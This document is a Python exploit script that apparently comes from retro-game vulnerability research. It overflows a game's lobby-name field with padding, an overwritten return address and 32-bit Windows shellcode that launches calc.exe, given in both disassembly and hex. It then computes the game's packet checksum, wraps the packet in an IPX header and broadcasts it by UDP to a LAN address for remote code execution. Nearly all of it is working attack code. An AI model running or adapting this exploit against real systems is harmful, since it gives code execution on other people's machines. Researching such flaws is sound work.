#!/usr/bin/env python3
from pwn import *
import socket

lobby_name = b''
lobby_name += b'1'*(32) # Padding
lobby_name += p32(0x0019FB72) #<===== RIP (Jump to shellcode)

lobby_name += p32(0x019FBEC-50) #  <----- Initial entry

####### 162 bytes of shellcode here
# Calc.exe shellcode
# Stolen from: https://ivanitlearning.wordpress.com/2018/10/13/windows-32-bit-shellcoding-101/
"""
    00:   31 db                   xor    ebx, ebx
    02:   64 8b 7b 30             mov    edi, DWORD PTR fs:[ebx+0x30]
    06:   8b 7f 0c                mov    edi, DWORD PTR [edi+0xc]
    09:   8b 7f 1c                mov    edi, DWORD PTR [edi+0x1c]
    0c:   8b 47 08                mov    eax, DWORD PTR [edi+0x8]
    0f:   8b 77 20                mov    esi, DWORD PTR [edi+0x20]
    12:   8b 3f                   mov    edi, DWORD PTR [edi]
    14:   80 7e 0c 33             cmp    BYTE PTR [esi+0xc], 0x33
    18:   75 f2                   jne    0xc
    1a:   89 c7                   mov    edi, eax
    1c:   03 78 3c                add    edi, DWORD PTR [eax+0x3c]
    1f:   8b 57 78                mov    edx, DWORD PTR [edi+0x78]
    22:   01 c2                   add    edx, eax
    24:   8b 7a 20                mov    edi, DWORD PTR [edx+0x20]
    27:   01 c7                   add    edi, eax
    29:   89 dd                   mov    ebp, ebx
    2b:   8b 34 af                mov    esi, DWORD PTR [edi+ebp*4]
    2e:   01 c6                   add    esi, eax
    30:   45                      inc    ebp
    31:   81 3e 43 72 65 61       cmp    DWORD PTR [esi], 0x61657243
    37:   75 f2                   jne    0x2b
    39:   81 7e 08 6f 63 65 73    cmp    DWORD PTR [esi+0x8], 0x7365636f
    40:   75 e9                   jne    0x2b
    42:   8b 7a 24                mov    edi, DWORD PTR [edx+0x24]
    45:   01 c7                   add    edi, eax
    47:   66 8b 2c 6f             mov    bp, WORD PTR [edi+ebp*2]
    4b:   8b 7a 1c                mov    edi, DWORD PTR [edx+0x1c]
    4e:   01 c7                   add    edi, eax
    50:   8b 7c af fc             mov    edi, DWORD PTR [edi+ebp*4-0x4]
    54:   01 c7                   add    edi, eax
    56:   89 d9                   mov    ecx, ebx
    58:   b1 ff                   mov    cl, 0xff
    5a:   53                      push   ebx
    5b:   e2 fd                   loop   0x5a
    5d:   68 63 61 6c 63          push   0x636c6163
    62:   89 e2                   mov    edx, esp
    64:   52                      push   edx
    65:   52                      push   edx
    66:   53                      push   ebx
    67:   53                      push   ebx
    68:   53                      push   ebx
    69:   53                      push   ebx
    6a:   53                      push   ebx
    6b:   53                      push   ebx
    6c:   52                      push   edx
    6d:   53                      push   ebx
    6e:   ff d7                   call   edi
"""

lobby_name += bytes.fromhex("31db648b7b308b7f0c8b7f1c8b47088b77208b3f807e0c3375f289c703783c8b577801c28b7a2001c789dd8b34af01c645813e4372656175f2817e086f63657375e98b7a2401c7668b2c6f8b7a1c01c78b7caffc01c789d9b1ff53e2fd6863616c6389e252525353535353535253ffd7")

lobby_name += cyclic(162-len(lobby_name))
###########################################

lobby_name += p32(0x19fbf0-70) # <------- 0x19fbec
lobby_name += p32(0x019FBF4-32) # <------- 0x19fbf0
lobby_name += p8(6) # <----- 0x019FBF4


########### Make lobby packet
# Everything after the command byte,
prefix = bytes.fromhex("000000000187a232cf880887c2000000007d0101080000")
suffix = bytes.fromhex("7d010000")

# Max name so that the length byte stays within 0x08..0xD0
max_name = 0xD0 - (1 + 2 + 3 + 1 + len(prefix) + 1 + len(suffix))
if len(lobby_name) > max_name:
    print("Lobby name too big. exitting...")
    exit(0)

name_bytes = lobby_name[:max_name]

body = prefix + name_bytes + b"\x00" + suffix

# length from the length byte to the end
length = 1 + 2 + 3 + 1 + len(body)

# Build payload with zeroed checksum for hashing
payload_no_checksum = b''
payload_no_checksum += p32(0xFFFFFFFE) # countdown
payload_no_checksum += p8(length) # length
payload_no_checksum += p8(8) # Player count CURRENT
payload_no_checksum += p8(8) # Player count MAX (or opposite way around, I forgot)
payload_no_checksum += b"\x00\x00\x00" # checksum placeholder
payload_no_checksum += p8(0x05) # CMD for lobby
payload_no_checksum += body


# Checksum inspired by: https://www.nccgroup.com/research-blog/retro-gaming-vulnerability-research-warcraft-2/
buf = bytearray(payload_no_checksum)
a1 = buf[4:] # length byte
length = a1[0]

# zero the 16-bit checksum word (2nd & 3rd checksum bytes)
a1[4] = a1[5] = 0

v = 0x144
for i in range(length):
    v7 = (a1[i] ^ v) & 0xFFFFFFFF
    v  = ((v7 << 3) & 0xFFFFFFFF) | (v7 >> 29)

v ^= (v >> 16)
w = (v ^ 0xAA55) & 0xFFFF

# first checksum byte is 0
checksum_res =  bytes([0, w & 0xFF, w >> 8])

# Payload with real checksum
payload_checksumed = b''
payload_checksumed += p32(0xFFFFFFFE) # countdown
payload_checksumed += p8(length) # length
payload_checksumed += p8(8) # Player count CURRENT
payload_checksumed += p8(8) # Player count MAX (or opposite way around, I forgot)
payload_checksumed += checksum_res # Actual checksum
payload_checksumed += p8(0x05) # CMD for lobby
payload_checksumed += body

# IPX wrapper prefix + big-endian length + payload
payload = b''
payload += bytes.fromhex("0000000001ffffffffffff87c20000000187a232cf880887c2") # Fixed IPX header
payload += p16(len(payload_checksumed), endian="big")
payload += payload_checksumed



# Create UDP socket
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM, socket.IPPROTO_UDP)

# Enable broadcasting mode
sock.setsockopt(socket.SOL_SOCKET, socket.SO_BROADCAST, 1)

print("Sending broadcast package...")

# Broadcast RCE

broadcast_ip = "192.168.1.255"
broadcast_port = 54792

sock.sendto(payload, (broadcast_ip, broadcast_port))

sock.close()
